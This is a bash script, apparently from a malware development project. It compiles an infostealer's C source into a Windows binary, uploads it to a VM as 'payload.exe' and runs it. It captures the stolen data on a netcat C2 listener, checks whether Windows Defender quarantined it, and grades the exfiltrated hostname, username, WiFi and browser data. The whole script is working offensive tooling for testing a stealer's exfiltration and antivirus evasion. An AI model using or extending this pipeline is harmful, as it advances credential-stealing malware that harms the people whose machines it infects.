#!/bin/bash
# Test malware: deploy compiled binary to VM, execute, capture C2 data, validate
# Usage: ./scripts/test_template.sh [--snapshot] <source_or_exe> [c2_ip] [c2_port]
#
# Accepts either a .c file (compiles it) or a .exe file (deploys directly).
# VM connection via env vars: VM_PORT, VM_USER, VM_PASS (defaults: 10022, vmuser, vmuser123)

set -e

USE_SNAPSHOT=0
if [ "$1" = "--snapshot" ]; then
    USE_SNAPSHOT=1
    shift
fi

INPUT="${1:-results/malware_source.c}"
C2_IP="${2:-10.0.2.2}"
C2_PORT="${3:-9001}"
VM_PORT="${VM_PORT:-10022}"
VM_USER="${VM_USER:-vmuser}"
VM_PASS="${VM_PASS:-vmuser123}"
LISTEN_IP=0.0.0.0
TIMEOUT=45

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJ_DIR="$(dirname "$SCRIPT_DIR")"

C2_RESULTS_DIR="${C2_RESULTS_DIR:-}"
C2_OUT="/tmp/c2_capture_$$.bin"
SSH="sshpass -p $VM_PASS ssh -o ConnectTimeout=10 -o StrictHostKeyChecking=no -p $VM_PORT $VM_USER@localhost"
SCP="sshpass -p $VM_PASS scp -o StrictHostKeyChecking=no -P $VM_PORT"

cleanup() {
    rm -f "$C2_OUT"
    kill $C2_PID 2>/dev/null || true
    if [ "$USE_SNAPSHOT" = "1" ]; then
        echo ""
        echo "[SNAPSHOT] Restoring VM to clean state..."
        "$SCRIPT_DIR/vm_snapshot.sh" restore test_run 2>&1 | sed 's/^/  /'
    fi
}
trap cleanup EXIT

echo "=== VM DEPLOYMENT TEST ==="
echo "Input: $INPUT"
echo "C2: $C2_IP:$C2_PORT"
echo "VM: $VM_USER@localhost:$VM_PORT"
echo ""

# Determine if we need to compile
EXE_PATH=""
if [[ "$INPUT" == *.exe ]]; then
    EXE_PATH="$INPUT"
    echo "[1/6] Using pre-compiled binary: $EXE_PATH"
    SIZE=$(stat -c%s "$EXE_PATH")
    echo "  $SIZE bytes"
elif [[ "$INPUT" == *.c ]]; then
    echo "[1/6] Compiling..."
    EXE_PATH="/tmp/malware_test_$$.exe"
    x86_64-w64-mingw32-gcc -o "$EXE_PATH" "$INPUT" \
        -lws2_32 -liphlpapi -lcrypt32 -lole32 -lshell32 -lgdi32 -lwininet -ldnsapi -static 2>&1
    SIZE=$(stat -c%s "$EXE_PATH")
    echo "  OK — $SIZE bytes"
else
    echo "ERROR: Input must be .c or .exe file"
    exit 1
fi
echo ""

if [ "$USE_SNAPSHOT" = "1" ]; then
    echo "[SNAPSHOT] Saving VM state before test..."
    "$SCRIPT_DIR/vm_snapshot.sh" save test_run 2>&1 | sed 's/^/  /'
    echo ""
fi

# 2. Check VM
echo "[2/6] Checking VM..."
if ! $SSH "echo ok" >/dev/null 2>&1; then
    echo "  FAIL — VM not reachable on port $VM_PORT"
    exit 1
fi
echo "  OK — VM alive"
echo ""

# 3. Defender status
echo "[3/6] Defender status..."
DEF_STATUS=$($SSH 'powershell -Command "Get-MpComputerStatus | Select-Object AMServiceEnabled,RealTimeProtectionEnabled,AntivirusEnabled | Format-List"' 2>/dev/null)
echo "$DEF_STATUS" | grep -E "Enabled" | while read l; do echo "  $l"; done
echo ""

# 4. Upload
echo "[4/6] Uploading to VM..."
$SCP "$EXE_PATH" "$VM_USER@localhost:C:\\Users\\$VM_USER\\Desktop\\payload.exe" 2>&1
echo "  OK"
echo ""

# 5. C2 listener + execute
echo "[5/6] Starting C2 listener on :$C2_PORT (${TIMEOUT}s timeout)..."
fuser -k "$C2_PORT/tcp" 2>/dev/null || true
sleep 1
timeout "$TIMEOUT" bash -c "nc -l -p $C2_PORT > '$C2_OUT'" &
C2_PID=$!
sleep 1

echo "  Executing on VM..."
$SSH "cmd /c \"C:\\Users\\$VM_USER\\Desktop\\payload.exe\"" >/dev/null 2>&1 &
EXEC_PID=$!

echo "  Waiting for C2 data..."
wait $C2_PID 2>/dev/null || true
wait $EXEC_PID 2>/dev/null || true

# 6. Analyze results
echo ""
echo "[6/6] Results:"
if [ ! -f "$C2_OUT" ] || [ ! -s "$C2_OUT" ]; then
    echo "  FAIL — No C2 data received"
    echo ""

    echo "  Checking Defender quarantine..."
    QUARANTINE=$($SSH 'powershell -Command "Get-MpThreatDetection | Select-Object -Last 3 | Format-List ThreatID,ProcessName,ActionSuccess"' 2>/dev/null)
    if [ -n "$QUARANTINE" ]; then
        echo "$QUARANTINE" | while read l; do echo "    $l"; done
    else
        echo "    No recent detections"
    fi

    EXISTS=$($SSH "if exist C:\\Users\\$VM_USER\\Desktop\\payload.exe (echo EXISTS) else (echo GONE)" 2>/dev/null)
    echo "  Binary on disk: $EXISTS"
    if [ "$EXISTS" = "GONE" ]; then
        echo "  → Defender quarantined the binary"
    fi
    exit 1
fi

C2_SIZE=$(stat -c%s "$C2_OUT")
echo "  C2 received: $C2_SIZE bytes"

# Copy to results — prefer package dir if set
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
if [ -n "$C2_RESULTS_DIR" ]; then
    RESULTS_FILE="$C2_RESULTS_DIR/exfil_${TIMESTAMP}.bin"
else
    RESULTS_FILE="$PROJ_DIR/results/c2_data/exfil_${TIMESTAMP}.bin"
    mkdir -p "$PROJ_DIR/results/c2_data"
fi
cp "$C2_OUT" "$RESULTS_FILE"
echo "  Saved: $RESULTS_FILE"
echo ""

# Show text portion
echo "--- C2 DATA (text preview) ---"
strings "$C2_OUT" | head -30
echo "--- END PREVIEW ---"
echo ""

# Validate content
CHECKS=0
PASSED=0

echo "Validation:"
if strings "$C2_OUT" | grep -qi "SYSTEM INFO"; then
    echo "  [PASS] System info collected"
    PASSED=$((PASSED+1))
else
    echo "  [FAIL] No system info"
fi
CHECKS=$((CHECKS+1))

if strings "$C2_OUT" | grep -qi "Hostname:"; then
    echo "  [PASS] Hostname captured"
    PASSED=$((PASSED+1))
else
    echo "  [FAIL] No hostname"
fi
CHECKS=$((CHECKS+1))

if strings "$C2_OUT" | grep -qi "Username:"; then
    echo "  [PASS] Username captured"
    PASSED=$((PASSED+1))
else
    echo "  [FAIL] No username"
fi
CHECKS=$((CHECKS+1))

if strings "$C2_OUT" | grep -qi "WIFI"; then
    echo "  [PASS] WiFi section present"
    PASSED=$((PASSED+1))
else
    echo "  [FAIL] No WiFi data"
fi
CHECKS=$((CHECKS+1))

if strings "$C2_OUT" | grep -qi "BROWSER"; then
    echo "  [PASS] Browser section present"
    PASSED=$((PASSED+1))
else
    echo "  [FAIL] No browser data"
fi
CHECKS=$((CHECKS+1))

if strings "$C2_OUT" | grep -qi "Adapter:\|IP:"; then
    echo "  [PASS] Network adapter info"
    PASSED=$((PASSED+1))
else
    echo "  [FAIL] No network info"
fi
CHECKS=$((CHECKS+1))

echo ""
echo "Result: $PASSED/$CHECKS checks passed"
if [ "$PASSED" -ge 5 ]; then
    echo "STATUS: PASS"
else
    echo "STATUS: FAIL"
    exit 1
fi
